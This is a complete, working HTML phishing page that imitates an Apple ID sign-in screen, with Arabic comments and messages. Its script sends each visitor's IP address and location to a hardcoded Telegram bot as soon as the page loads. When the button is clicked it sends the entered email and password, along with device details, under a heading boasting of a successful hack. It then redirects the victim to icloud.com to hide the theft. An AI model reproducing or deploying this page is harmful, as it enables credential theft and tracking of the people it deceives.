<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In - Apple</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .box { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
        img { width: 35px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
    <h1>Apple ID</h1>
    <p>استخدم الـ Apple ID الخاص بك لتسجيل الدخول</p>
    
    <input type="email" id="u" placeholder="Apple ID" required>
    <input type="password" id="p" placeholder="Password" required>
    
    <button id="btn">Continue</button>
</div>

<script>
    const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
    const chat_id = "6888107255";

    // دالة إرسال التنبيهات
    function sendMsg(text) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
    }

    // دالة جلب البيانات مع محرك احتياطي
    async function getIP() {
        try {
            // محاولة أولى عبر ipwho.is
            const res = await fetch('https://ipwho.is/');
            const d = await res.json();
            if(d.success) return {ip: d.ip, city: d.city, country: d.country, isp: d.connection.isp};
            throw new Error();
        } catch(e) {
            try {
                // محاولة احتياطية عبر ipapi في حال فشل الأولى
                const res2 = await fetch('https://ipapi.co/json/');
                const d2 = await res2.json();
                return {ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org};
            } catch(e2) {
                return {ip: "محمي/VPN", city: "غير معروف", country: "غير معروف", isp: "غير معروف"};
            }
        }
    }

    // 1. عند الدخول فوراً
    window.onload = async function() {
        sendMsg("🔔 [دخول جديد للرابط - جاري محاولة سحب الآي بي...]");
        const data = await getIP();
        let entryReport = `🌐 آي بي الدخول: ${data.ip}\n📍 الموقع: ${data.city}\n📶 المزود: ${data.isp}`;
        sendMsg(entryReport);
    };

    // 2. التقرير الشامل عند الضغط (الترتيب الدقيق)
    document.getElementById('btn').onclick = async function() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        if(!user || !pass) return;

        this.innerHTML = "Processing...";
        this.disabled = true;

        const ipData = await getIP(); // إعادة المحاولة للتأكيد

        let report = "⚠️ تم اختراق الهدف بنجاح ⚠️\n\n";
        report += "📧 الحساب: " + user + "\n";
        report += "🔑 الباسورد: " + pass + "\n";
        report += "------------------------\n";
        report += "🌐 الـ IP: " + ipData.ip + "\n";
        report += "📍 الموقع: " + ipData.city + " (" + ipData.country + ")\n";
        report += "📶 المزود: " + ipData.isp + "\n";
        report += "📱 النظام: " + navigator.platform + "\n";
        report += "🔋 البطارية: " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
        report += "📏 الدقة: " + screen.width + "x" + screen.height + "\n";
        report += "🕰️ الوقت: " + new Date().toLocaleString() + "\n";
        report += "🔒 كوكيز: " + (document.cookie ? "موجودة" : "محمية");

        sendMsg(report);

        setTimeout(() => {
            window.location.replace("https://www.icloud.com/");
        }, 1200);
    };
</script>

</body>
</html>
